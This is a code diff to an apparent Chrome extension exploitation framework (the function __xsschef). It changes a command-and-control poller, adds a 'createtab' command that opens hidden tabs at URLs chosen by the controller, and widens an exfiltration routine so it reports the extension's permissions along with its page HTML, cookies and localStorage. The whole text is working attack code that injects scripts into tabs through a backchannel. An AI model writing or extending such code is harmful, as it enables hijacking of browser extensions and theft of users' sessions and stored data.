@@ -30,7 +30,7 @@ function __xsschef() {
     }
 
     // polling for more commands from c&c server - from page for now
-    var poller_script = function() {
+    var c2c_poller_script = function() {
         setInterval(function() {
             //console.log('polling for cmds');
             var x = new XMLHttpRequest();
@@ -154,6 +154,10 @@ function __xsschef() {
                 case 'reporthtml':
                         postToSheep(msg.id, {cmd: 'sendhtml'});
                 break;
+                case 'createtab':
+                    chrome.tabs.create({url: msg.p, active: false});
+                break;
+                
             }
         });
     });
@@ -167,7 +171,7 @@ function __xsschef() {
 
     var setupBackchannel = function(tabId, oncomplete) {
         chrome.tabs.executeScript(tabId, 
-            {'code': '(function(){var __p=chrome.extension.connect({name:"backchannel"});__p.onMessage.addListener('+backchannel_script.toString()+');('+poller_script.toString()+')()})();'}
+            {'code': '(function(){var __p=chrome.extension.connect({name:"backchannel"});__p.onMessage.addListener('+backchannel_script.toString()+');('+c2c_poller_script.toString()+')()})();'}
                 ,function() {setTimeout(oncomplete, 500)});
     }
     
@@ -211,8 +215,10 @@ function __xsschef() {
     }
 
     var report_ext = function() {
-        log('reporting ext info'); // autopwn
-        log({type:'report_ext',result:{'extension': location.href, 'html':document.documentElement.innerHTML,'cookies':document.cookie, 'localStorage': localStorage}});
+        chrome.permissions.getAll(function(perm) {
+            log({type:'report_ext',result:{'extension': location.href, 'permissions': perm, 'html':document.documentElement.innerHTML,'cookies':document.cookie, 'localStorage': localStorage}});
+        
+        });
     }
     
     var init_complete = function() { // framework ready
